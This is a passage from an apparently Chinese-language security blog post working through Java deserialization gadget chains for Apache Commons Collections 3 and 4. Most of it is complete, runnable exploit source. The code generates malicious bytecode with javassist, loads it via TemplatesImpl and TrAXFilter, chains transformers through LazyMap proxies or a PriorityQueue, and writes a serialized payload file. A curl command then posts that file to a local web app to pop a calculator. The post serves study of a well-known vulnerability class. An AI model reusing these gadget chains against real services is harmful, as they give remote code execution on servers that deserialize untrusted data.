<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建代理类的实例</span></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">InvocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, lazyMap);</span><br><span class="line"><span class="comment">//创建hashmap的动态代理instance，现在我们只需要call 到evilMap的任意function就可以触发代理类的invoke了</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">testMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">evilMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(testMap.getClass().getClassLoader(), testMap.getClass().getInterfaces(),InvocationHandler);</span><br><span class="line"><span class="comment">//创建第二个代理类的实例</span></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">anotherInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, evilMap);</span><br><span class="line"><span class="comment">/* 写出序列化文件 */</span></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>((<span class="string">&quot;test.ser&quot;</span>)));</span><br><span class="line">outputStream.writeObject(anotherInvocationHandler);</span><br><span class="line">outputStream.close();</span><br></pre></td></tr></table></figure>

<p>用web环境实验一下:<code>curl http://localhost:9090/webTest1_Web_exploded/test --data-binary @test.ser</code></p>
<p>计算器成功弹出</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211201162910487.png" alt="image-20211201162910487"></p>
<h3 id="Payload构造-2"><a href="#Payload构造-2" class="headerlink" title="Payload构造"></a>Payload构造</h3><h4 id="方法一-InvokerTransformer"><a href="#方法一-InvokerTransformer" class="headerlink" title="方法一 InvokerTransformer"></a>方法一 InvokerTransformer</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections3</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/* 生成字节码 */</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        classPool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>((AbstractTranslet.class)));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);<span class="comment">//通过CtClass.makeClassInitializer方法在当前类创建了一个静态代码块</span></span><br><span class="line">        cc.setName(<span class="string">&quot;Leihehe&quot;</span>);</span><br><span class="line">        cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));<span class="comment">//必须要继承AbstractTranslet类</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = cc.toBytecode();<span class="comment">//获取字节码</span></span><br><span class="line">        <span class="comment">/* TemplatesImpl加载字节码 */</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();<span class="comment">//创建一个templates对象</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;leihehe&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">trAXFilterClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;</span>);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(trAXFilterClass),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getConstructor&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newInstance&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">classToSerialize</span> <span class="operator">=</span> <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> Constructor&lt;?&gt; constructor = Class.forName(classToSerialize).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建代理类的实例</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">InvocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, lazyMap);</span><br><span class="line">        <span class="comment">//创建hashmap的动态代理instance，现在我们只需要call 到evilMap的任意function就可以触发代理类的invoke了</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">testMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">evilMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(testMap.getClass().getClassLoader(), testMap.getClass().getInterfaces(),InvocationHandler);</span><br><span class="line">        <span class="comment">//创建第二个代理类的实例</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">anotherInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, evilMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 写出序列化文件 */</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>((<span class="string">&quot;test.ser&quot;</span>)));</span><br><span class="line">        outputStream.writeObject(anotherInvocationHandler);</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="方法二-InstantiateTransformer"><a href="#方法二-InstantiateTransformer" class="headerlink" title="方法二 InstantiateTransformer"></a>方法二 InstantiateTransformer</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections3Method2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/* 生成字节码 */</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        classPool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>((AbstractTranslet.class)));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);<span class="comment">//通过CtClass.makeClassInitializer方法在当前类创建了一个静态代码块</span></span><br><span class="line">        cc.setName(<span class="string">&quot;Leihehe&quot;</span>);</span><br><span class="line">        cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));<span class="comment">//必须要继承AbstractTranslet类</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = cc.toBytecode();<span class="comment">//获取字节码</span></span><br><span class="line">        <span class="comment">/* TemplatesImpl加载字节码 */</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();<span class="comment">//创建一个templates对象</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;leihehe&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">classToSerialize</span> <span class="operator">=</span> <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> Constructor&lt;?&gt; constructor = Class.forName(classToSerialize).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建代理类的实例</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">InvocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, lazyMap);</span><br><span class="line">        <span class="comment">//创建hashmap的动态代理instance，现在我们只需要call 到evilMap的任意function就可以触发代理类的invoke了</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">testMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">evilMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(testMap.getClass().getClassLoader(), testMap.getClass().getInterfaces(),InvocationHandler);</span><br><span class="line">        <span class="comment">//创建第二个代理类的实例</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">anotherInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, evilMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 写出序列化文件 */</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>((<span class="string">&quot;test.ser&quot;</span>)));</span><br><span class="line">        outputStream.writeObject(anotherInvocationHandler);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>综合了cc1和cc2，利用了之前学过的动态代理。</p>
<h3 id="Reference-2"><a href="#Reference-2" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://www.anquanke.com/post/id/230788">Ysoserial CommonsCollections1 详细分析</a></p>
<p><a href="https://www.anquanke.com/post/id/233393">ysoserial CommonsCollections3/4 详细分析</a></p>
<p><a href="https://0range228.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/">Java反序列化利用链补全计划</a></p>
<h2 id="Commons-Collections-4"><a href="#Commons-Collections-4" class="headerlink" title="Commons Collections 4"></a>Commons Collections 4</h2><h3 id="环境搭建-3"><a href="#环境搭建-3" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
<li><p>commons-collections4:4.0</p>
</li>
<li><p>jdk7u21之前</p>
</li>
</ul>
<h3 id="利用链构造"><a href="#利用链构造" class="headerlink" title="利用链构造"></a>利用链构造</h3><p>在<code>commons-collections4:4.0</code>中，<code>InvokerTransfomer()</code>不能再用了，所以我们用到了</p>
<ul>
<li>cc2的前部分: PriorityQueue -&gt; TransformingComparator</li>
<li>cc3的后部分：InstanitateTransformer-&gt;TrAXFilter -&gt; TemplatesImpl</li>
</ul>
<h3 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/* 生成字节码 */</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        classPool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>((AbstractTranslet.class)));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);<span class="comment">//通过CtClass.makeClassInitializer方法在当前类创建了一个静态代码块</span></span><br><span class="line">        cc.setName(<span class="string">&quot;Leihehe&quot;</span>);</span><br><span class="line">        cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));<span class="comment">//必须要继承AbstractTranslet类</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = cc.toBytecode();<span class="comment">//获取字节码</span></span><br><span class="line">        <span class="comment">/* TemplatesImpl加载字节码 */</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();<span class="comment">//创建一个templates对象</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;leihehe&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(String.class);</span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;haha&quot;</span>&#125;);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                constantTransformer,</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">/* 创建TransformingComparator */</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 创建PriorityQueue */</span></span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">2</span>,comparator);</span><br><span class="line">        <span class="comment">//priorityQueue -&gt; TransformingComparator.compare -&gt; ChainedTransformer.transform</span></span><br><span class="line">        queue.add(<span class="number">1</span>);<span class="comment">//add elements</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        setFieldValue(constantTransformer,<span class="string">&quot;iConstant&quot;</span>,TrAXFilter.class);<span class="comment">//需要在最后一步修改，否则出错</span></span><br><span class="line"></span><br><span class="line">        setFieldValue(instantiateTransformer,<span class="string">&quot;iParamTypes&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;);</span><br><span class="line">        setFieldValue(instantiateTransformer,<span class="string">&quot;iArgs&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 写出序列化文件 */</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>((<span class="string">&quot;test.ser&quot;</span>)));</span><br><span class="line">        outputStream.writeObject(queue);</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们知道<code>PriorityQueue</code>在使用<code>add()</code>方法的时候，会执行其<code>comparator</code>，导致利用链会在序列化前就被触发而程序终止。所以我们需要在add之后再把我们利用链用到的东西放进去。例如<code>constantTransformer</code>和<code>InstantiateTransformer</code>都是如此，我们在add之后才对他们的参数进行修改。</p>
